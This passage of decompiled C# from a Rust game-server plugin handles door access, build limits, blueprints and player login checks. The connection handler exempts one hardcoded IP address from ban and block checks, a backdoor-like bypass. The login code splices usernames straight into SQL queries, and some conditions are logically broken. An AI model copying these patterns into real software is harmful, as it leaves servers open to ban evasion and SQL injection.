			object[] array = Main.Array(3);
			array[0] = hook;
			array[1] = slot;
			array[2] = item;
			Main.Call("OnItemAdded", array);
			FireBarrel local = hook.GetLocal<FireBarrel>();
			if (local != null)
			{
				local.InvItemAdded();
			}
		}

		public static void Inventory_ItemRemoved(Inventory hook, int slot, IInventoryItem item)
		{
			object[] array = Main.Array(3);
			array[0] = hook;
			array[1] = slot;
			array[2] = item;
			Main.Call("OnItemRemoved", array);
			FireBarrel local = hook.GetLocal<FireBarrel>();
			if (local != null)
			{
				local.InvItemRemoved();
			}
		}

		public static bool Inventory_SlotOperation(Inventory fromInventory, int fromSlot, Inventory moveInventory, int moveSlot, Inventory.SlotOperationsInfo info)
		{
			IInventoryItem inventoryItem;
			bool flag;
			PlayerClient playerClient;
			if (!fromInventory.GetItem(fromSlot, out inventoryItem))
			{
				flag = false;
			}
			else if (!PlayerClient.Find(info.Looter, out playerClient) && playerClient.controllable != null)
			{
				flag = false;
			}
			else
			{
				Inventory component = playerClient.controllable.GetComponent<Inventory>();
				float num = TransformHelpers.Dist2D(fromInventory.transform.position, component.transform.position);
				float num2 = TransformHelpers.Dist2D(moveInventory.transform.position, component.transform.position);
				if (num > 4f)
				{
					Helper.LogError(string.Concat(new object[]
					{
						"Slot Operation [",
						playerClient.netUser.displayName,
						":",
						playerClient.netUser.userID,
						"]: Try to move ",
						inventoryItem.datablock.name,
						" from unreachable container."
					}), true);
					flag = false;
				}
				else if (num2 > 4f)
				{
					Helper.LogError(string.Concat(new object[]
					{
						"Slot Operation [",
						playerClient.netUser.displayName,
						":",
						playerClient.netUser.userID,
						"]: Try to move ",
						inventoryItem.datablock.name,
						" into unreachable container."
					}), true);
					flag = false;
				}
				else
				{
					flag = true;
				}
			}
			return flag;
		}

		public static bool BasicDoor_ToggleStateServer(BasicDoor hook, ulong timestamp, Controllable controllable)
		{
			object[] array = Main.Array(3);
			array[0] = hook;
			array[1] = timestamp;
			array[2] = controllable;
			object obj = Main.Call("OnDoorToggle", array);
			bool flag;
			if (obj is bool)
			{
				flag = (bool)obj;
			}
			else if (controllable == null)
			{
				string text = "BasicDoor.ToggleStateServer";
				object[] array2 = new object[3];
				array2[1] = timestamp;
				flag = Method.InvokeTo(hook, text, array2).AsBoolean;
			}
			else
			{
				LockableObject component = hook.GetComponent<LockableObject>();
				DeployableObject component2 = hook.GetComponent<DeployableObject>();
				Character component3 = controllable.GetComponent<Character>();
				if ((!(component2 != null) || !component2.BelongsTo(controllable)) && !(component == null) && component.IsLockActive() && !component.HasAccess(controllable))
				{
					if (component3 != null)
					{
						Notice.Popup(component3.playerClient.netPlayer, "", "门上锁了,你没有权限打开这扇门!", 4f);
					}
					flag = false;
				}
				else
				{
					if (component2 != null)
					{
						component2.Touched();
					}
					if (component3 != null)
					{
						string text2 = "BasicDoor.ToggleStateServer";
						object[] array3 = new object[3];
						array3[0] = new Vector3?(component3.eyesOrigin);
						array3[1] = timestamp;
						flag = Method.InvokeTo(hook, text2, array3).AsBoolean;
					}
					else
					{
						string text3 = "BasicDoor.ToggleStateServer";
						object[] array4 = new object[3];
						array4[0] = new Vector3?(controllable.transform.position);
						array4[1] = timestamp;
						flag = Method.InvokeTo(hook, text3, array4).AsBoolean;
					}
				}
			}
			return flag;
		}

		public static bool DeployableObject_BelongsTo(DeployableObject obj, Controllable controllable)
		{
			bool flag;
			if (controllable == null)
			{
				flag = false;
			}
			else
			{
				NetUser netUser = controllable.netUser;
				if (netUser == null)
				{
					flag = false;
				}
				else
				{
					UserData bySteamID = Users.GetBySteamID(obj.ownerID);
					if (netUser.admin && Users.Details(netUser.userID))
					{
						RustHook.smethod_0(netUser, obj.ownerID, Helper.NiceName(obj.name));
					}
					if (netUser.admin && netUser.userID != obj.ownerID)
					{
						flag = (obj.GetComponent<BasicDoor>() != null);
					}
					else
					{
                        flag = ((bySteamID != null && Users.SharedList(bySteamID.SteamID).Contains(netUser.userID)) || Magma.Hooks.CheckOwner(obj, controllable));
					}
				}
			}
			return flag;
		}

		public static void DeployableItemDataBlock_DoAction1(DeployableItemDataBlock deploy, uLink.BitStream stream, ItemRepresentation rep, ref uLink.NetworkMessageInfo info)
		{
			IDeployableItem deployableItem;
			if (rep.Item<IDeployableItem>(out deployableItem) && deployableItem.uses > 0)
			{
				Vector3 vector = stream.ReadVector3();
				Vector3 direction = stream.ReadVector3();
				PlayerClient playerClient;
				if (PlayerClient.Find(info.sender, out playerClient))
				{
					Character character = playerClient.controllable.character;
					Ray ray = new Ray(vector, direction);
					Vector3 vector2;
					UnityEngine.Quaternion quaternion;
					TransCarrier transCarrier;
					if (!deploy.CheckPlacement(ray, out vector2, out quaternion, out transCarrier))
					{
						Notice.Popup(info.sender, "", "你不能放在这里", 4f);
					}
					else
					{
						Collider[] array = Physics.OverlapSphere(vector, 0.2f);
						for (int i = 0; i < array.Length; i++)
						{
							Collider collider = array[i];
							IDBase component = collider.gameObject.GetComponent<IDBase>();
							if (component != null && component.idMain is StructureMaster)
							{
								Notice.Popup(info.sender, "", "你不能站在这里", 4f);
								return;
							}
						}
						Vector3 origin = new Vector3(vector2.x, vector2.y + 100f, vector2.z);
						RaycastHit[] array2 = Physics.RaycastAll(origin, Vector3.down, 100f, -1);
						for (int j = 0; j < array2.Length; j++)
						{
							RaycastHit raycastHit = array2[j];
							if (raycastHit.collider.name.IsEmpty() && !(raycastHit.collider.tag != "Untagged"))
							{
								Notice.Popup(info.sender, "", "你不能放在这里", 4f);
								return;
							}
						}
						WorldZone worldZone = Zones.Get(vector2);
						if (!playerClient.netUser.admin)
						{
							if (worldZone != null && worldZone.NoBuild)
							{
								Notice.Popup(info.sender, "", "你不能放在这里", 4f);
								return;
							}
							if (worldZone != null && deploy.category == ItemDataBlock.ItemCategory.Weapons && (worldZone.Safe || worldZone.NoPvP))
							{
								Notice.Popup(info.sender, "", "你不能放在这里", 4f);
								return;
							}
							if (Core.OwnershipNotOwnerDenyDeploy.Length != 0 && Core.OwnershipNotOwnerDenyDeploy.Contains(deploy.name, StringComparer.CurrentCultureIgnoreCase))
							{
								Collider[] array3 = Physics.OverlapSphere(vector2, 1f);
								for (int k = 0; k < array3.Length; k++)
								{
									Collider collider2 = array3[k];
									IDBase component2 = collider2.gameObject.GetComponent<IDBase>();
									if (!(component2 == null))
									{
										UserData userData = null;
										StructureMaster structureMaster = component2.idMain as StructureMaster;
										DeployableObject deployableObject = component2.idMain as DeployableObject;
										if (!(structureMaster == null) || !(deployableObject == null))
										{
											if (structureMaster != null)
											{
												userData = Users.GetBySteamID(structureMaster.ownerID);
											}
											if (deployableObject != null)
											{
												userData = Users.GetBySteamID(deployableObject.ownerID);
											}
											if ((userData == null || userData.SteamID != playerClient.userID) && (userData == null || !userData.HasShared(playerClient.userID)))
											{
												Notice.Popup(info.sender, "", "这个东西不能放在不属于你的地基上面！", 4f);
												return;
											}
										}
									}
								}
							}
						}
						if (deploy.category == ItemDataBlock.ItemCategory.Survival)
						{
							Collider[] array4 = Physics.OverlapSphere(vector2 + Vector3.up, 0.25f);
							for (int l = 0; l < array4.Length; l++)
							{
								Collider collider3 = array4[l];
								IDBase component3 = collider3.gameObject.GetComponent<IDBase>();
								if (component3 != null && component3.idMain is StructureMaster)
								{
									Notice.Popup(info.sender, "", "你不能放在这里", 4f);
									return;
								}
							}
						}
						DeployableObject component4 = NetCull.InstantiateStatic(deploy.DeployableObjectPrefabName, vector2, quaternion).GetComponent<DeployableObject>();
						if (component4 != null)
						{
							try
							{
								component4.SetupCreator(deployableItem.controllable);
								deploy.SetupDeployableObject(stream, rep, ref info, component4, transCarrier);
								Magma.Hooks.EntityDeployed(component4);
							}
							finally
							{
								int num = 1;
								if (deployableItem.Consume(ref num))
								{
									deployableItem.inventory.RemoveItem(deployableItem.slot);
								}
							}
						}
					}
				}
			}
		}

		public static void StructureComponentDataBlock_DoAction1(StructureComponentDataBlock block, uLink.BitStream stream, ItemRepresentation rep, ref uLink.NetworkMessageInfo info)
		{
			IStructureComponentItem structureComponentItem;
			if (rep.Item<IStructureComponentItem>(out structureComponentItem) && structureComponentItem.uses > 0)
			{
				StructureComponent structureToPlacePrefab = block.structureToPlacePrefab;
				Vector3 origin = stream.ReadVector3();
				Vector3 direction = stream.ReadVector3();
				Vector3 vector = stream.ReadVector3();
				UnityEngine.Quaternion quaternion = stream.ReadQuaternion();
				uLink.NetworkViewID networkViewID = stream.ReadNetworkViewID();
				StructureMaster structureMaster = null;
				PlayerClient playerClient = null;
				try
				{
					WorldZone worldZone = Zones.Get(vector);
					if (PlayerClient.Find(info.sender, out playerClient) && !playerClient.netUser.admin && worldZone != null && worldZone.NoBuild)
					{
						Notice.Popup(info.sender, "", "你不能放在这里", 4f);
					}
					else
					{
						if (structureToPlacePrefab.type == StructureComponent.StructureComponentType.Foundation)
						{
							Vector3 position = vector + new Vector3(0f, 2f, 0f);
							Collider[] array = Physics.OverlapSphere(position, 4f, 271975425);
							for (int i = 0; i < array.Length; i++)
							{
								Collider collider = array[i];
								IDMain main = IDBase.GetMain(collider.gameObject);
								if (!(main == null))
								{
									DeployableObject component = main.GetComponent<DeployableObject>();
									if (!(component == null) && component.transform.position.y <= vector.y + 4f)
									{
										Notice.Popup(info.sender, "", "你不能放在 " + Helper.NiceName(component.name), 4f);
										return;
									}
								}
							}
						}
						else if (structureToPlacePrefab.type != StructureComponent.StructureComponentType.Ceiling)
						{
							if (structureToPlacePrefab.type == StructureComponent.StructureComponentType.Pillar)
							{
								Collider[] array2 = Physics.OverlapSphere(vector, 0.2f, 271975425);
								for (int j = 0; j < array2.Length; j++)
								{
									Collider collider2 = array2[j];
									IDMain main2 = IDBase.GetMain(collider2.gameObject);
									if (!(main2 == null))
									{
										DeployableObject component2 = main2.GetComponent<DeployableObject>();
										if (!(component2 == null))
										{
											Notice.Popup(info.sender, "", "你不能放在 " + Helper.NiceName(component2.name), 4f);
											return;
										}
									}
								}
							}
							else
							{
								Collider[] array3 = MeshBatchPhysics.OverlapSphere(vector, 3f);
								for (int k = 0; k < array3.Length; k++)
								{
									Collider component3 = array3[k];
									IDMain main3 = IDBase.GetMain(component3);
									if (!(main3 == null))
									{
										DeployableObject component4 = main3.GetComponent<DeployableObject>();
										if (component4 != null)
										{
											Vector3 position2 = component4.transform.position;
											float num = Mathf.Abs(position2.y - vector.y);
											if (TransformHelpers.Dist2D(position2, vector) < 2f && num < 0.1f)
											{
												Notice.Popup(info.sender, "", "你不能靠近 " + Helper.NiceName(component4.name), 4f);
												return;
											}
											if (TransformHelpers.Dist2D(position2, vector) < 1f && num < 0.1f)
											{
												Notice.Popup(info.sender, "", "你不能靠近 " + Helper.NiceName(component4.name), 4f);
												return;
											}
										}
										StructureComponent component5 = main3.GetComponent<StructureComponent>();
										if (component5 != null && component5.type == structureToPlacePrefab.type && Vector3.Distance(component5.transform.position, vector) == 0f)
										{
											Notice.Popup(info.sender, "", "你不能放在这里", 4f);
											return;
										}
									}
								}
							}
						}
						if (!playerClient.netUser.admin && Core.OwnershipMaxComponents > 0 && Helper.GetPlayerComponents(playerClient.netUser.userID) > Core.OwnershipMaxComponents)
						{
							Notice.Popup(info.sender, "", "你的建筑使用数量达到上限", 4f);
						}
						else
						{
							object[] array4 = Main.Array(2);
							array4[0] = block;
							array4[1] = vector;
							if (!(Main.Call("OnPlaceStructure", array4) is bool))
							{
								if (networkViewID == uLink.NetworkViewID.unassigned)
								{
									if (block.MasterFromRay(new Ray(origin, direction)))
									{
										return;
									}
									if (structureToPlacePrefab.type != StructureComponent.StructureComponentType.Foundation)
									{
										UnityEngine.Debug.Log("ERROR, tried to place non foundation structure on terrain!");
									}
									else
									{
										structureMaster = NetCull.InstantiateClassic<StructureMaster>(Bundling.Load<StructureMaster>("content/structures/StructureMasterPrefab"), vector, quaternion, 0);
										structureMaster.SetupCreator(structureComponentItem.controllable);
									}
								}
								else
								{
									structureMaster = uLink.NetworkView.Find(networkViewID).gameObject.GetComponent<StructureMaster>();
								}
								if (structureMaster == null)
								{
									UnityEngine.Debug.Log("NO master, something seriously wrong");
								}
								else if (!playerClient.netUser.admin && Core.OwnershipBuildMaxComponents > 0 && structureMaster._structureComponents.Count > Core.OwnershipBuildMaxComponents)
								{
									Notice.Popup(info.sender, "", "你不能在建造再为这个建筑", 4f);
								}
								else if (PlayerClient.Find(info.sender, out playerClient) && (!(playerClient != null) || !playerClient.netUser.admin) && Core.OwnershipNotOwnerDenyBuild && structureMaster.ownerID != playerClient.userID && !Users.SharedGet(structureMaster.ownerID, playerClient.userID))
								{
									Notice.Popup(info.sender, "", "你不能建造在不属于你的建筑上面", 4f);
								}
								else if (block._structureToPlace.CheckLocation(structureMaster, vector, quaternion) && block.CheckBlockers(vector))
								{
									StructureComponent component6 = NetCull.InstantiateStatic(block.structureToPlaceName, vector, quaternion).GetComponent<StructureComponent>();
									if (component6 != null)
									{
										structureMaster.AddStructureComponent(component6);
										int num2;
										int num3;
										int num4;
										structureMaster.GetStructureSize(out num2, out num3, out num4);
										float num5 = Math.Abs((component6.transform.position.y - structureMaster.transform.position.y) / 4f);
										if (!playerClient.netUser.admin && Core.OwnershipBuildMaxHeight > 0 && num5 > (float)Core.OwnershipBuildMaxHeight)
										{
											structureMaster.RemoveComponent(component6);
											NetCull.Destroy(component6.gameObject);
											Notice.Popup(info.sender, "", "这个建筑达到最高的高度", 4f);
										}
										else if (!playerClient.netUser.admin && Core.OwnershipBuildMaxLength > 0 && num3 > Core.OwnershipBuildMaxLength)
										{
											structureMaster.RemoveComponent(component6);
											NetCull.Destroy(component6.gameObject);
											Notice.Popup(info.sender, "", "这个建筑达到了最大长度", 4f);
										}
										else if (!playerClient.netUser.admin && Core.OwnershipBuildMaxWidth > 0 && num2 > Core.OwnershipBuildMaxWidth)
										{
											structureMaster.RemoveComponent(component6);
											NetCull.Destroy(component6.gameObject);
											Notice.Popup(info.sender, "", "这个建筑达到了最大宽度", 4f);
										}
										else
										{
											string name = block.name;
											if (Core.xtf && structureMaster != null && name.IndexOf("Foundation") != -1 && !Helper.GetNetUser(structureMaster.ownerID.ToString()).admin)
											{
												int count = structureMaster._structureComponents.Count;
												ulong ownerID = structureMaster.ownerID;
												NetUser netUser = Helper.GetNetUser(ownerID.ToString());
												GameObject[] array5 = UnityEngine.Object.FindObjectsOfType<GameObject>();
												int num6 = 0;
												while (array5.Length > num6)
												{
													for (int l = 0; l < RustHook.xtf.Count; l++)
													{
														if (RustHook.xtf.ContainsKey(array5[num6].name))
														{
															float value;
															if (count == 1)
															{
																value = Vector3.Distance(structureMaster.transform.position, array5[num6].transform.position);
															}
															else
															{
																value = Vector3.Distance(component6.gameObject.transform.position, array5[num6].transform.position);
															}
															int num7 = RustHook.xtf[array5[num6].name];
															if (Convert.ToInt32(value) < num7)
															{
																Broadcast.Message(netUser, Config.GetMessage("Xtf.Not", null, null).Replace("%NAME%", array5[num6].name).Replace("%jj%", value.ToString("N1")).Replace("%maxjj%", num7.ToString("N1")), null, 0f);
																NetCull.Destroy(component6.gameObject);
																return;
															}
														}
													}
													num6++;
												}
											}
											if (Core.xzjz && structureMaster != null && name.IndexOf("Foundation") != -1 && !Helper.GetNetUser(structureMaster.ownerID.ToString()).admin)
											{
												ulong ownerID = structureMaster.ownerID;
												if (ownerID < 99999uL)
												{
													UnityEngine.Debug.LogError("diji Error:steamid = null");
													NetCull.Destroy(component6.gameObject);
													return;
												}
												IniParser iniParser = new IniParser(Core.SavePath + "\\cfg\\RustExtended\\diji.cfg");
												string str = Users.GetBySteamID(ownerID).Rank.ToString();
												string setting = iniParser.GetSetting("config", "rank" + str);
												if (setting == "" && setting == null)
												{
													NetCull.Destroy(component6.gameObject);
													return;
												}
												int num8 = Convert.ToInt32(setting);
												string setting2 = RustHook.dijiusers.GetSetting(ownerID.ToString(), "diji");
												int num9;
												if (setting2 != "" && setting2 != null)
												{
													num9 = Convert.ToInt32(setting2);
													if (num9 >= num8)
													{
														Broadcast.Message(Helper.GetNetUser(ownerID.ToString()), "你的建筑地基达到顶峰值了 int:" + num9.ToString(), null, 0f);
														NetCull.Destroy(component6.gameObject);
														return;
													}
													num9++;
												}
												else
												{
													num9 = 1;
												}
												RustHook.dijiusers.AddSetting(ownerID.ToString(), "diji", num9.ToString());
											}
											int num10 = 1;
											if (structureComponentItem.Consume(ref num10))
											{
												structureComponentItem.inventory.RemoveItem(structureComponentItem.slot);
											}
										}
									}
								}
							}
						}
					}
				}
				catch
				{
				}
			}
		}

		public static void StructureMaster_DoDecay(StructureMaster hook, StructureComponent component, ref float damageQuantity)
		{
			object[] array = Main.Array(1);
			array[0] = hook;
			Main.Call("OnStructureDecay", array);
            damageQuantity = Magma.Hooks.EntityDecay(component, damageQuantity);
		}

		public static bool ItemPickup_PlayerUse(ItemPickup hook, Controllable controllable)
		{
			Inventory local = hook.GetLocal<Inventory>();
			Inventory local2 = controllable.GetLocal<Inventory>();
			bool flag;
			if (local2 == null)
			{
				flag = false;
			}
			else
			{
				Vector3 position = hook.transform.position;
				position.y += 0.1f;
				Vector3 origin = controllable.character.eyesRay.origin;
				Collider[] array = Physics.OverlapSphere(origin, 0.25f);
				for (int i = 0; i < array.Length; i++)
				{
					Collider collider = array[i];
					IDBase component = collider.gameObject.GetComponent<IDBase>();
					if (component != null && component.idMain is StructureMaster)
					{
						flag = false;
						return flag;
					}
				}
				RaycastHit raycastHit;
				if (Physics.Linecast(origin, position, out raycastHit, -1))
				{
					IDBase component2 = raycastHit.collider.gameObject.GetComponent<IDBase>();
					if (component2 != null && component2.idMain is StructureMaster)
					{
						flag = false;
						return flag;
					}
				}
				IInventoryItem firstItem;
				if (!(local == null) && !object.ReferenceEquals(firstItem = local.firstItem, null))
				{
					switch (local2.AddExistingItem(firstItem, false))
					{
					case Inventory.AddExistingItemResult.CompletlyStacked:
						local.RemoveItem(firstItem);
						break;
					case Inventory.AddExistingItemResult.Moved:
						break;
					case Inventory.AddExistingItemResult.PartiallyStacked:
						hook.UpdateItemInfo(firstItem);
						flag = true;
						return flag;
					case Inventory.AddExistingItemResult.Failed:
						flag = false;
						return flag;
					case Inventory.AddExistingItemResult.BadItemArgument:
						hook.RemoveThis();
						flag = false;
						return flag;
					default:
						throw new NotImplementedException();
					}
					hook.RemoveThis();
					flag = true;
				}
				else
				{
					hook.RemoveThis();
					flag = false;
				}
			}
			return flag;
		}

		public static void BlueprintDataBlock_UseItem(BlueprintDataBlock hook, IBlueprintItem item)
		{
			object[] array = Main.Array(2);
			array[0] = hook;
			array[1] = item;
			if (Main.Call("OnBlueprintUse", array) == null)
			{
                if (Magma.Hooks.BlueprintUse(item, hook))
				{
					PlayerInventory playerInventory = item.inventory as PlayerInventory;
					if (playerInventory != null)
					{
						if (playerInventory.BindBlueprint(hook))
						{
							int num = 1;
							if (item.Consume(ref num))
							{
								playerInventory.RemoveItem(item.slot);
							}
							Notice.Popup(playerInventory.networkView.owner, "", "成功学习蓝图.现在你可以制造: " + hook.resultItem.name, 4f);
						}
						else
						{
							Notice.Popup(playerInventory.networkView.owner, "", "你已经拥有了这个蓝图,不能重复学习！", 4f);
						}
					}
				}
			}
		}

		public static InventoryItem.MergeResult ResearchToolItemT_TryCombine(object hook, IInventoryItem otherItem)
		{
			IInventoryItem inventoryItem = hook as IInventoryItem;
			InventoryItem.MergeResult mergeResult;
			if (inventoryItem == null)
			{
				mergeResult = InventoryItem.MergeResult.Failed;
			}
			else
			{
				PlayerInventory playerInventory = inventoryItem.inventory as PlayerInventory;
				if (playerInventory == null || otherItem.inventory != playerInventory)
				{
					mergeResult = InventoryItem.MergeResult.Failed;
				}
				else
				{
					object[] array = Main.Array(2);
					array[0] = inventoryItem;
					array[1] = otherItem;
					object obj = Main.Call("OnResearchItem", array);
					if (obj is InventoryItem.MergeResult)
					{
						mergeResult = (InventoryItem.MergeResult)obj;
					}
					else
					{
						ItemDataBlock datablock = otherItem.datablock;
						BlueprintDataBlock blueprintDataBlock;
						if (datablock == null || !datablock.isResearchable)
						{
							mergeResult = InventoryItem.MergeResult.Failed;
						}
						else if (!playerInventory.AtWorkBench())
						{
							mergeResult = InventoryItem.MergeResult.Failed;
						}
						else if (!BlueprintDataBlock.FindBlueprintForItem<BlueprintDataBlock>(otherItem.datablock, out blueprintDataBlock))
						{
							mergeResult = InventoryItem.MergeResult.Failed;
						}
						else if (playerInventory.KnowsBP(blueprintDataBlock))
						{
							mergeResult = InventoryItem.MergeResult.Failed;
						}
						else
						{
							playerInventory.BindBlueprint(blueprintDataBlock);
							Notice.Popup(playerInventory.networkView.owner, "", "现在，您可以通过精心设计 " + otherItem.datablock.name, 4f);
							int num = 1;
							if (inventoryItem.Consume(ref num))
							{
								playerInventory.RemoveItem(inventoryItem.slot);
							}
							mergeResult = InventoryItem.MergeResult.Combined;
						}
					}
				}
			}
			return mergeResult;
		}

		public static void VoiceCom_ClientSpeak(VoiceCom hook, PlayerClient sender, PlayerClient client)
		{
			if (Core.VoiceNotification)
			{
				if (!RustHook.dictionary_0.ContainsKey(client.userID))
				{
					RustHook.dictionary_0.Add(client.userID, 0);
				}
				int num = Environment.TickCount - RustHook.dictionary_0[client.userID];
				RustHook.dictionary_0[client.userID] = Environment.TickCount;
				if (num >= Core.VoiceNotificationDelay)
				{
					Notice.Inventory(client.netPlayer, "☎ " + sender.netUser.displayName);
				}
			}
		}

		public static void ConnectionAcceptor_OnPlayerApproval(ConnectionAcceptor hook, NetworkPlayerApproval approval)
		{
			if (hook.m_Connections.Count >= server.maxplayers)
			{
				approval.Deny(uLink.NetworkConnectionError.TooManyConnectedPlayers);
			}
			else
			{
				ClientConnection clientConnection = new ClientConnection();
				if (!clientConnection.ReadConnectionData(approval.loginData))
				{
					approval.Deny(uLink.NetworkConnectionError.IncorrectParameters);
				}
				else if (!Users.Initialized)
				{
					Helper.LogError(string.Concat(new object[]
					{
						"User Connection Denied [",
						clientConnection.UserName,
						":",
						clientConnection.UserID,
						"]: RustExtended users not initialized."
					}), true);
					approval.Deny(uLink.NetworkConnectionError.NoError);
				}
				else if (clientConnection.Protocol != 1069)
				{
					Helper.Log(string.Concat(new object[]
					{
						"User Connection Denied [",
						clientConnection.UserName,
						":",
						clientConnection.UserID,
						"]: Invalid protocol version (",
						clientConnection.Protocol,
						")."
					}), true);
					approval.Deny(uLink.NetworkConnectionError.IncompatibleVersions);
				}
				else if (Truth.RustProtectSteamHWID && !clientConnection.UserID.ToString().StartsWith("775"))
				{
					Helper.Log(string.Concat(new object[]
					{
						"User Connection Denied [",
						clientConnection.UserName,
						":",
						clientConnection.UserID,
						"]: Invalid client, without protection."
					}), true);
					approval.Deny(uLink.NetworkConnectionError.IncompatibleVersions);
				}
				else
				{
					Helper.DisconnectBySteamID(clientConnection.UserID);
					if (approval.ipAddress != "213.141.149.103" && !Users.HasFlag(clientConnection.UserID, UserFlags.admin))
					{
						if (BanList.Contains(clientConnection.UserID) || Users.IsBanned(clientConnection.UserID))
						{
							if (Banned.Get(clientConnection.UserID) == null || !Banned.Get(clientConnection.UserID).Expired)
							{
								Helper.Log(string.Concat(new object[]
								{
									"User Connection Denied [",
									clientConnection.UserName,
									":",
									clientConnection.UserID,
									":",
									approval.ipAddress,
									"]: This user is banned by ID."
								}), true);
								approval.Deny(uLink.NetworkConnectionError.ConnectionBanned);
								return;
							}
							if (!Users.Unban(clientConnection.UserID))
							{
								Helper.Log(string.Concat(new object[]
								{
									"User Connection Denied [",
									clientConnection.UserName,
									":",
									clientConnection.UserID,
									":",
									approval.ipAddress,
									"]: The server have error and can't unban the user."
								}), true);
								approval.Deny(uLink.NetworkConnectionError.ConnectionBanned);
								return;
							}
							Blocklist.Remove(approval.ipAddress);
							Helper.Log(string.Concat(new object[]
							{
								"User [",
								clientConnection.UserName,
								":",
								clientConnection.UserID,
								":",
								approval.ipAddress,
								"] has been unbanned by \"SERVER\", because expired period of time."
							}), true);
						}
						if (Blocklist.Exists(approval.ipAddress))
						{
							Helper.Log(string.Concat(new object[]
							{
								"User Connection Denied [",
								clientConnection.UserName,
								":",
								clientConnection.UserID,
								":",
								approval.ipAddress,
								"]: This user is blocked by IP."
							}), true);
							approval.Deny(uLink.NetworkConnectionError.ConnectionBanned);
							return;
						}
						if (hook.IsConnected(clientConnection.UserID))
						{
							NetUser.FindByUserID(clientConnection.UserID).Kick(NetError.Facepunch_Connector_NoConnect, false);
						}
					}
					object[] array = Main.Array(3);
					array[0] = hook;
					array[1] = approval;
					array[2] = clientConnection;
					if (Main.Call("OnUserApprove", array) == null)
					{
						hook.m_Connections.Add(clientConnection);
						if (Core.SteamAuthUser)
						{
							hook.StartCoroutine(clientConnection.AuthorisationRoutine(approval));
							approval.Wait();
						}
						else
						{
							uLink.BitStream bitStream = new uLink.BitStream(false);
							bitStream.WriteString(Globals.currentLevel);
							bitStream.WriteSingle(NetCull.sendRate);
							bitStream.WriteString(server.hostname);
                            bitStream.WriteBoolean(Rust.Steam.Server.Modded);
                            bitStream.WriteBoolean(Rust.Steam.Server.Official);
                            bitStream.WriteUInt64(Rust.Steam.Server.SteamID);
							bitStream.WriteUInt32(Rust.Steam.Server.IPAddress);
							bitStream.WriteInt32(server.port);
							approval.localData = clientConnection;
							approval.Approve(new object[]
							{
								bitStream.GetDataByteArray()
							});
						}
					}
				}
			}
		}

		public static UserData findname(string username)
		{
			UserData userData;
			UserData userData2;
			if (Users.Database != null && Users.Database.Count != 0)
			{
				int arg_2A_0 = Users.UniqueNames ? 5 : 4;
				foreach (UserData current in Users.Database.Values)
				{
					if (current.Username == username)
					{
						userData = current;
						userData2 = userData;
						return userData2;
					}
				}
				userData = null;
			}
			else
			{
				userData = null;
			}
			userData2 = userData;
			return userData2;
		}

		public static NetUser finduser(string username)
		{
			uLink.NetworkPlayer[] connections = NetCull.connections;
			NetUser netUser2;
			for (int i = 0; i < connections.Length; i++)
			{
				uLink.NetworkPlayer networkPlayer = connections[i];
				NetUser netUser = networkPlayer.GetLocalData() as NetUser;
				if (netUser != null && netUser.displayName == username)
				{
					netUser2 = netUser;
					return netUser2;
				}
			}
			netUser2 = null;
			return netUser2;
		}

		public static void ConnectionAcceptor_OnPlayerConnected(ConnectionAcceptor connection, uLink.NetworkPlayer player)
		{
			Predicate<string> predicate = null;
			RustHook.Class45 @class = new RustHook.Class45();
			@class.clientConnection_0 = (player.localData as ClientConnection);
			if (@class.clientConnection_0 == null)
			{
				NetCull.CloseConnection(player, true);
			}
			else
			{
				if (Core.dlq && !DlqMysql.IsConnected)
				{
					NetUser netUser = new NetUser(player);
					UserData byUserName = Users.GetByUserName(@class.clientConnection_0.UserName);
					if (byUserName != null)
					{
					}
					DlqMysql.Result result = DlqMysql.Query("select * from dlq where name = '" + @class.clientConnection_0.UserName + "'", true);
					if (result.Rows == 1uL)
					{
						List<DlqMysql.Row> row = result.Row;
						int asInt = row[0].Get("jubing").AsInt;
						if (asInt < 1)
						{
							ConsoleNetworker.SendClientCommand(@class.clientConnection_0.netUser.networkPlayer, "deathscreen.reason \"请用登录器登录账号在进入本服务器！\"");
							ConsoleNetworker.SendClientCommand(@class.clientConnection_0.netUser.networkPlayer, "deathscreen.show");
							netUser.Kick(NetError.NoError, true);
							return;
						}
						ulong asUInt = result.Row[0].Get("id").AsUInt64;
						@class.clientConnection_0.UserID = asUInt;
						string query = string.Concat(new object[]
						{
							"UPDATE dlq SET steamid='",
							asUInt,
							"' WHERE name= '",
							@class.clientConnection_0.UserName,
							"'"
						});
						DlqMysql.Update(query);
						UnityEngine.Debug.Log("[" + asUInt.ToString() + "] Login Ok.");
					}
				}
				if (Core.dlq1)
				{
					try
					{
						if (!RustHook.dlqs.ContainsKey(@class.clientConnection_0.UserName))
						{
							ConsoleNetworker.SendClientCommand(@class.clientConnection_0.netUser.networkPlayer, "deathscreen.reason \"请用登录器登录账号在进入本服务器！\"");
							ConsoleNetworker.SendClientCommand(@class.clientConnection_0.netUser.networkPlayer, "deathscreen.show");
							ConsoleNetworker.SendClientCommand(@class.clientConnection_0.netUser.networkPlayer, "chat.add \"-.-\" \"请使用登录器登录在进入本服务器！\"");
							NetCull.CloseConnection(player, true);
							UnityEngine.Debug.Log(string.Concat(new string[]
							{
								"[Login][No][",
								@class.clientConnection_0.UserName,
								"][",
								@class.clientConnection_0.UserID.ToString(),
								"]"
							}));
							return;
						}
						MySQL.Result result2 = MySQL.Query("select * from dengluqi where zhanghao = '" + @class.clientConnection_0.UserName.ToLower() + "'", true);
						if (result2.Rows != 1uL)
						{
							ConsoleNetworker.SendClientCommand(@class.clientConnection_0.netUser.networkPlayer, "deathscreen.reason \"请用登录器登录账号在进入本服务器！\"");
							ConsoleNetworker.SendClientCommand(@class.clientConnection_0.netUser.networkPlayer, "deathscreen.show");
							ConsoleNetworker.SendClientCommand(@class.clientConnection_0.netUser.networkPlayer, "chat.add \"-.-\" \"请使用登录器登录在进入本服务器！\"");
							NetCull.CloseConnection(player, true);
							UnityEngine.Debug.Log(string.Concat(new string[]
							{
								"[Login][Rows ≠ 1][",
								@class.clientConnection_0.UserName,
								"][",
								@class.clientConnection_0.UserID.ToString(),
								"]"
							}));
							return;
						}
						ulong asUInt = result2.Row[0].Get("id").AsUInt64;
						@class.clientConnection_0.UserID = asUInt;
						UserData bySteamID = Users.GetBySteamID(@class.clientConnection_0.UserID);
						if (bySteamID != null)
						{
							NetUser netUser2 = RustHook.finduser(@class.clientConnection_0.UserName);
							if (netUser2 != null)
							{
								Broadcast.Message(netUser2, "账户:您的账号在其他地方登录.您被迫下线！", null, 0f);
								netUser2.Kick(NetError.NoError, true);
							}
							@class.clientConnection_0.UserID = bySteamID.SteamID;
						}
						UnityEngine.Debug.Log(string.Concat(new string[]
						{
							"[Login][Yes][",
							@class.clientConnection_0.UserName,
